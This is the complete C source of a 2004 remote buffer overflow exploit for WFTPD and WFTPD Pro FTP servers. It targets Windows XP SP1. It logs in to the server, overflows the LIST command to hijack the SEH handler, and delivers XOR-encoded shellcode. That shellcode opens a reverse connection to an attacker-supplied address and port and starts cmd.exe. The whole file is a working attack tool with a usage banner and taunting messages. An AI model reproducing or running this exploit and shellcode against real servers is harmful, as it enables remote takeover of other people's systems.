/*
* WFTPD buffer overflow exploit, (c) axl 2004, rdxaxl@hotmail.com
* Discovered by the very same guy :p
*
* Tested WFTPD versions:
*
* - WFTPD Pro Server 3.21 Release 1 (trial) (latest version)
* - WFTPD Pro Server 3.20 Release 2 (trial)
* - WFTPD Server 3.21 Release 1 (trial) (latest version)
* - WFTPD Server 3.10 Release 1 (trial)
*
* Tested exploit with these remote operating systems:
*
* - Windows XP Pro, SP1
*
* Should be very easy to support other Windows OSes. You may only have
* to update ret_addr.
*/

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#include <windows.h>
#include <stdio.h>

#define MAXLINE 0x1000

//#define OLDCODE // Try not to uncomment this...

#ifdef OLDCODE
static char* ret_addr = "\xAC\x9C\xEC\x77"; 
// kernel32.dll 5.1.2600.1106, (WinXP Pro SP1, EN) => pop reg / pop reg / ret
#else
/* See the comment in exploit() for the reasons I chose this address */
static char* ret_addr = "\x5B\xC0\xEB\x77"; 
// kernel32.dll 5.1.2600.1106, (WinXP Pro SP1, EN) => pop reg / pop reg / ret
#endif

const unsigned int shlc_offs_enckey = 0x00000025;
const unsigned int shlc_offs_encstart = 0x0000002B;
const unsigned int shlc_offs_encend = 0x000001B8;
unsigned char shlc_code[] =
"\xEB\x16\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56\x34\x12\x78\x56"
"\x34\x12\x5B\x53\x83\xEB\x1D\xC3\xE8\xF5\xFF\xFF\xFF\x33\xC9\xB1"
"\x64\x81\x74\x8B\x27\x55\x55\x55\x55\xE2\xF6\xFC\x8B\x43\x0A\x31"
"\x43\x02\x8B\x43\x0E\x31\x43\x06\x89\x4B\x0A\x89\x4B\x0E\x64\x8B"
"\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\xAD\x8B\x68\x08\x8D"
"\x83\x67\x01\x00\x00\x55\xE8\xB7\x00\x00\x00\x68\x33\x32\x00\x00"
"\x68\x77\x73\x32\x5F\x54\xFF\xD0\x96\x8D\x83\x74\x01\x00\x00\x56"
"\xE8\x9D\x00\x00\x00\x81\xEC\x90\x01\x00\x00\x54\x68\x01\x01\x00"
"\x00\xFF\xD0\x8D\x83\x7F\x01\x00\x00\x56\xE8\x83\x00\x00\x00\x33"
"\xC9\x51\x51\x51\x6A\x06\x6A\x01\x6A\x02\xFF\xD0\x97\x8D\x83\x8A"
"\x01\x00\x00\x56\xE8\x69\x00\x00\x00\x33\xC9\x51\x51\x51\x51\x6A"
"\x10\x8D\x4B\x02\x51\x57\xFF\xD0\xB9\x54\x00\x00\x00\x2B\xE1\x88"
"\x6C\x0C\xFF\xE2\xFA\xC6\x44\x24\x10\x44\x41\x88\x4C\x24\x3C\x88"
"\x4C\x24\x3D\x89\x7C\x24\x48\x89\x7C\x24\x4C\x89\x7C\x24\x50\x49"
"\x8D\x44\x24\x10\x54\x50\x51\x51\x51\x6A\x01\x51\x51\x8D\x83\xA4"
"\x01\x00\x00\x50\x51\x8D\x83\x95\x01\x00\x00\x55\xE8\x11\x00\x00"
"\x00\x59\xFF\xD0\x8D\x83\xAC\x01\x00\x00\x55\xE8\x02\x00\x00\x00"
"\xFF\xD0\x60\x8B\x7C\x24\x24\x8D\x6F\x78\x03\x6F\x3C\x8B\x6D\x00"
"\x03\xEF\x83\xC9\xFF\x41\x3B\x4D\x18\x72\x0B\x64\x89\x0D\x00\x00"
"\x00\x00\x8B\xE1\xFF\xE4\x8B\x5D\x20\x03\xDF\x8B\x1C\x8B\x03\xDF"
"\x8B\x74\x24\x1C\xAC\x38\x03\x75\xDC\x43\x84\xC0\x75\xF6\x8B\x5D"
"\x24\x03\xDF\x0F\xB7\x0C\x4B\x8B\x5D\x1C\x03\xDF\x8B\x0C\x8B\x03"
"\xCF\x89\x4C\x24\x1C\x61\xC3\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61"
"\x72\x79\x41\x00\x57\x53\x41\x53\x74\x61\x72\x74\x75\x70\x00\x57"
"\x53\x41\x53\x6F\x63\x6B\x65\x74\x41\x00\x57\x53\x41\x43\x6F\x6E"
"\x6E\x65\x63\x74\x00\x43\x72\x65\x61\x74\x65\x50\x72\x6F\x63\x65"
"\x73\x73\x41\x00\x63\x6D\x64\x2E\x65\x78\x65\x00\x45\x78\x69\x74"
"\x50\x72\x6F\x63\x65\x73\x73\x00";

static char inbuf[MAXLINE];
static unsigned inoffs = 0;

const WFTPD_PRO_321_TRIAL = 0; // WFTPD Pro Server 3.21 Release 1 (trial)
const WFTPD_PRO_320_TRIAL = 1; // WFTPD Pro Server 3.20 Release 2 (trial)
const WFTPD_321_TRIAL = 2; // WFTPD Server 3.21 Release 1 (trial)
const WFTPD_310_TRIAL = 3; // WFTPD Server 3.10 Release 1 (trial)
int ftpver = WFTPD_PRO_321_TRIAL;

int isrd(SOCKET s)
{
fd_set r;
FD_ZERO(&r);
FD_SET(s, &r);
timeval t = {0, 0};
int ret = select(1, &r, NULL, NULL, &t);
if (ret < 0)
return 0;
else
return ret != 0;
}

int get_line(SOCKET s, char* string, unsigned len)
{
char* nl;
while ((nl = (char*)memchr(inbuf, '\n', inoffs)) == NULL)
{
if (inoffs >= sizeof(inbuf))
{
printf("[-] Too long line\n");
return 0;
}
int len = recv(s, &inbuf[inoffs], sizeof(inbuf) - inoffs, 0);
if (len <= 0)
{
printf("[-] Error receiving data\n");
return 0;
}

inoffs += len;
}

unsigned nlidx = (unsigned)(ULONG_PTR)(nl - inbuf);
if (nlidx >= len)
{
printf("[-] Too small caller buffer\n");
return 0;
}
memcpy(string, inbuf, nlidx);
string[nlidx] = 0;
if (nlidx > 0 && string[nlidx-1] == '\r')
string[nlidx-1] = 0;

if (nlidx + 1 >= inoffs)
inoffs = 0;
else
{
memcpy(inbuf, &inbuf[nlidx+1], inoffs - (nlidx + 1));
inoffs -= nlidx + 1;
}

return 1;
}

int ignorerd(SOCKET s)
{
inoffs = 0;

while (1)
{
if (!isrd(s))
return 1;
if (recv(s, inbuf, sizeof(inbuf), 0) < 0)
return 0;
}
}

int get_reply_code(SOCKET s)
{
char line[MAXLINE];

if (!get_line(s, line, sizeof(line)))
{
printf("[-] Could not get status code\n");
return -1;
}

char c = line[3];
line[3] = 0;
int code;
if (!(c == ' ' || c == '-') || strlen(line) != 3 || !(code = atoi(line)))
{
printf("[-] Weird reply\n");
return -1;
}

char endline[4];
memcpy(endline, line, 3);
endline[3] = ' ';
if (c == '-')
{
while (1)
{
if (!get_line(s, line, sizeof(line)))
{
printf("[-] Could not get next line\n");
return -1;
}
if (!memcmp(line, endline, sizeof(endline)))
break;
}
}

return code;
}

int sendb(SOCKET s, const char* buf, int len, int flags)
{
while (len)
{
int l = send(s, buf, len, flags);
if (l <= 0)
break;
len -= l;
buf += l;
}

return len == 0;
}

int sends(SOCKET s, const char* buf, int flags)
{
return sendb(s, buf, (int)strlen(buf), flags);
}

int is_valid_char(char c)
{
return c != 0 && c != '\n' && c != ' ';
}

int add_bytes(void* dst, int& dstoffs, int dstlen, const void* src, int srclen)
{
if (dstoffs + srclen > dstlen || dstoffs + srclen < dstoffs)
{
printf("[-] Buffer overflow ;)\n");
return 0;
}

memcpy((char*)dst+dstoffs, src, srclen);
dstoffs += srclen;
return 1;
}

int check_invd_bytes(const char* name, const void* buf, int buflen)
{
const char* b = (const char*)buf;

for (int i = 0; i < buflen; i++)
{
if (!is_valid_char(b[i]))
{
printf("[-] %s[%u] (%02X) cannot contain bytes 00h, 0Ah, or 20h\n", name, i, b[i]);
return 0;
}
}

return 1;
}

int enc_byte(char& c, char& k)
{
for (int i = 0; i < 0x100; i++)
{
if (!is_valid_char(c ^ i) || !is_valid_char(i))
continue;

c ^= i;
k = i;
return 1;
}

printf("[-] Could not find encryption key for byte %02X\n", c);
return 0;
}

int get_enc_key(char* buf, int size, int offs, int step)
{
for (int i = 0; i < 0x100; i++)
{
if (!is_valid_char(i))
continue;

for (int j = offs; j < size; j += step)
{
if (!is_valid_char(buf[j] ^ i))
break;
}
if (j < size)
continue;

return i;
}

printf("[-] Could not find an encryption key\n");
return -1;
}

int exploit(SOCKET s, unsigned long sip, unsigned short sport)
{
printf("[+] Trying buffer overflow + using SEH handler\n");

int ret = 0;

char* shellcode = NULL;
__try
{
shellcode = new char[sizeof(shlc_code)-1];
memcpy(shellcode, shlc_code, sizeof(shlc_code)-1);

shellcode[2] = (char)AF_INET;
shellcode[3] = (char)(AF_INET >> 8);
shellcode[4] = (char)(sport >> 8);
shellcode[5] = (char)sport;
shellcode[6] = (char)(sip >> 24);
shellcode[7] = (char)(sip >> 16);
shellcode[8] = (char)(sip >> 8);
shellcode[9] = (char)sip;
for (int i = 0; i < 8; i++)
{
if (!enc_byte(shellcode[2+i], shellcode[2+8+i]))
__leave;
}

for (int i = 0; i < 4; i++)
{
int k = get_enc_key(&shellcode[shlc_offs_encstart], shlc_offs_encend-shlc_offs_encstart, i, 4);
if (k < 0)
__leave;
shellcode[shlc_offs_enckey+i] = k;
}
printf("[+] Shellcode encryption key = %02X%02X%02X%02X\n", shellcode[shlc_offs_enckey+3],
shellcode[shlc_offs_enckey+2], shellcode[shlc_offs_enckey+1], shellcode[shlc_offs_enckey]);
for (int i = 0; i < shlc_offs_encend-shlc_offs_encstart; i++)
shellcode[shlc_offs_encstart+i] ^= shellcode[shlc_offs_enckey + i % 4];

if (!ignorerd(s))
__leave;

char sndbuf[0x1000];
int sndbufidx = 0;
char* badval = "\x01\xFF\x02\xFE";
const char* ftp_cmd = "LIST -";
if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ftp_cmd, (int)strlen(ftp_cmd))) // req
__leave;
switch (ftpver)
{
#ifdef OLDCODE
case WFTPD_310_TRIAL: // doesn't save EBP on the stack
case WFTPD_321_TRIAL: // doesn't save EBP on the stack
case WFTPD_PRO_320_TRIAL:
if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "-WFTPD_EXPLOIT_BY_AXL_(C)_2004-", 31) || // 31-byte string
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\x90\x90\xEB\x28", 4) || // old fs:[0]
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // exception handler
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // trylevel
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // old EBP
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // ret addr
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg1
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg2
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg3
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg4
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg5
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4)) // arg6
__leave;
break;

case WFTPD_PRO_321_TRIAL:
default:
if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "-WFTPD_EXPLOIT_BY_AXL_(C)_2004-", 31) || // 31-byte string
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // cookie
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\x90\x90\xEB\x28", 4) || // old fs:[0]
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // exception handler
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // trylevel
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // old EBP
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // ret addr
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg1
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg2
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg3
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg4
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) || // arg5
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4)) // arg6
__leave;
break;
#else
case WFTPD_310_TRIAL: // doesn't save EBP on the stack
case WFTPD_321_TRIAL: // doesn't save EBP on the stack
case WFTPD_PRO_320_TRIAL:
case WFTPD_PRO_321_TRIAL: // pushes a cookie after old fs:[0]
default:
/*
* WFTPD Pro Server 3.21 saves a cookie so that the stack layout isn't the same as the
* other versions. However, with the right exception address, we can make it work.
* 77EBC05B = kernel32.dll => POP REG / POP REG / RET. This is the exception handler
* the older versions will execute. WFTPD Pro Server 3.21 will instead execute the
* instructions with the bytes in that same address. In this case, it'll execute these
* instructions:
* 5B POP EBX
* C0EB 77 SHR BL,77
* 5B POP EBX
* C0EB 77 SHR BL,77
* EB 1E JMP SHORT ourcode
*/
if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "-WFTPD_EXPLOIT_BY_AXL_(C)_2004-", 31) || // 31-byte string
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\x90\x90\xEB\x28", 4) || // old fs:[0] OR cookie (p321)
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // exception handler OR old fs:[0] (p321)
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), ret_addr, 4) || // trylevel OR exception handler (p321)
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), "\xEB\x1E\xFE\xFF", 4) || // (p321)
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4) ||
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), badval, 4))
__leave;
break;
#endif
}
if (!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), shellcode, sizeof(shlc_code)-1) || // our code
!add_bytes(sndbuf, sndbufidx, sizeof(sndbuf), " \r\n", 3)) // req + end of line
__leave;

if (!check_invd_bytes("shellcode", shellcode, sizeof(shlc_code)-1) ||
!check_invd_bytes("ret_addr", ret_addr, sizeof(ret_addr)-1) ||
!check_invd_bytes("sndbuf", sndbuf+5, sndbufidx-3-5))
__leave;

in_addr a; a.s_addr = htonl(sip);
printf("[+] Sending shellcode which will connect to %s:%u...\n", inet_ntoa(a), sport);
if (!sendb(s, sndbuf, sndbufidx, 0))
{
printf("[-] Failed to send shellcode\n");
__leave;
}
printf("[+] Shellcode sent successfully\n");

ret = 1;
}
__finally
{
delete shellcode;
}

if (ret == 0)
printf("[-] Can't exploit the vulnerability\n");

return ret;
}

int login(SOCKET s, const char* username, const char* userpass)
{
printf("[+] Logging in...\n");
int code;
if (!ignorerd(s) || !sends(s, "USER ", 0) || !sends(s, username, 0) ||
!sends(s, "\r\n", 0) || (code = get_reply_code(s)) < 0)
{
printf("[-] Failed to log in #1\n");
return 0;
}

if (code == 331)
{
if (!sends(s, "PASS ", 0) || !sends(s, userpass, 0) ||
!sends(s, "\r\n", 0) || (code = get_reply_code(s)) < 0)
{
printf("[-] Failed to log in #2\n");
return 0;
}
}

if (code != 230)
{
printf("[-] Failed to log in. Code %3u\n", code);
return 0;
}

printf("[+] Logged in\n");
return 1;
}

void show_help(char* pname)
{
printf("%s <ip> <port> <sip> <sport> [-u username] [-p userpass] [-v <p321|p320|321|310>]\n", pname);
exit(1);
}

int main(int argc, char** argv)
{
printf("WFTPD <= v3.21r1 buffer overflow exploit, (c) axl 2004, rdxaxl@hotmail.com\n");

WSADATA wsa;
if (WSAStartup(0x0202, &wsa))
return 1;

if (argc < 5)
show_help(argv[0]);

unsigned long ip = ntohl(inet_addr(argv[1]));
unsigned short port = (unsigned short)atoi(argv[2]);
unsigned long sip = ntohl(inet_addr(argv[3]));
unsigned short sport = (unsigned short)atoi(argv[4]);
const char* username = "anonymous";
const char* userpass = "axl";

for (int i = 5; i < argc; i++)
{
if (!strcmp(argv[i], "-u") && i + 1 < argc)
{
username = argv[++i];
}
else if (!strcmp(argv[i], "-p") && i + 1 < argc)
{
userpass = argv[++i];
}
else if (!strcmp(argv[i], "-v") && i + 1 < argc)
{
if (!stricmp(argv[i+1], "p321"))
ftpver = WFTPD_PRO_321_TRIAL;
else if (!stricmp(argv[i+1], "p320"))
ftpver = WFTPD_PRO_320_TRIAL;
else if (!stricmp(argv[i+1], "321"))
ftpver = WFTPD_321_TRIAL;
else if (!stricmp(argv[i+1], "310"))
ftpver = WFTPD_310_TRIAL;
else
show_help(argv[0]);
i++;
}
else
show_help(argv[0]);
}

if (!ip || !port || !sip || !sport)
show_help(argv[0]);

sockaddr_in saddr;
memset(&saddr, 0, sizeof(saddr));
saddr.sin_family = AF_INET;
saddr.sin_port = htons(port);
saddr.sin_addr.s_addr = htonl(ip);

SOCKET s = INVALID_SOCKET;
__try
{
in_addr a; a.s_addr = htonl(ip);
printf("[+] Connecting to %s:%u...\n", inet_ntoa(a), port);
s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if (s < 0 || connect(s, (sockaddr*)&saddr, sizeof(saddr)) < 0)
{
printf("[-] Could not connect\n");
__leave;
}
printf("[+] Connected\n");

int code = get_reply_code(s);
if (code != 220)
{
printf("[-] Got reply %3u\n", code);
__leave;
}
if (!login(s, username, userpass))
__leave;

if (!exploit(s, sip, sport))
printf("[-] Lucky bastards...\n");
else
printf("[+] Santa's watching you!\n");
}
__finally
{
if (s != INVALID_SOCKET)
closesocket(s);
}

return 0;
}
